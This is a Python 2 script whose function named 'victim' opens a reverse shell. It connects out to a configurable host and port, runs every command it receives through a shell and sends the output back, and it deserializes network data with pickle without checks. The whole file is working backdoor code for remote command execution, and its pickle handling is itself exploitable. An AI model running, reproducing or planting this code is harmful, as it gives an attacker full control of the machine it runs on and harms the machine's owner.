#!/usr/bin/python
import os
import socket
import pickle
import re
import sys
import datetime
import subprocess
import threading
from Queue import Queue

#This program sends messages in form of list and recieves in form of list. End of message is represented by ENDDDD string in last of list.

def connect(systemip,port):
        s2=socket.socket()
        s2.connect((systemip,port))
        return s2

def listen(serverip,port):
	s=socket.socket()
	s.bind((serverip,port))
	s.listen(5)
	return s

def accept(socket):
	c, addr=socket.accept()
	print "connection has been established with "+str(addr[0])+" from port "+str(addr[1])
	return (c,addr)

def sendmessage(connection,msg):
	msg.append("ENDDDD")
	msgs=""
	try:
		msgs=pickle.dumps(msg)
	except:
		str1="Some different format."
		msgs=pickle.dumps([str1,"ENDDDD"])	
	connection.send(msgs)
	return True

def recvmessage(connection):
	while True:
		out=connection.recv(32000)
		if(out):
			try:
				out=pickle.loads(out)
			except:
				str1="Some different format."
				out=[str1,"ENDDDD"]
		result=[]
		for each in out:
			if(re.search('ENDDDD',each)):
				break
			if(each):
				result.append(each)
			#print each
		return result

def runcommand(cmd):
	print cmd
	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
	(out,err)=proc.communicate()
	print out
	result=out.split("\n")
	return result

def closeconn(conn):
	conn.close()

def recvcommands(conn):
	while True:
		cmds=recvmessage(conn)
		for each in cmds:
			if each[:2] == "cd" :
				os.chdir(each[3:])
			if(each == "quitv"):
				result=runcommand("echo exit & exit")
				result.append(str(os.getcwd())+">")
				sendmessage(conn,result)
				return -1
			if(len(each) > 0):
				result=runcommand(each)
				result.append(str(os.getcwd())+">")
				sendmessage(conn,result)
				
				
				
	
def victim():
	ip='localhost'
	port=44445
	if(len(sys.argv) > 1):
		port = int(sys.argv[1])
	conn=connect(ip,port)
	res=recvcommands(conn)
	if(res == -1):
		closeconn(conn)
		sys.exit(0)
	
	
def main():
	victim()

if __name__ == '__main__':
        main()
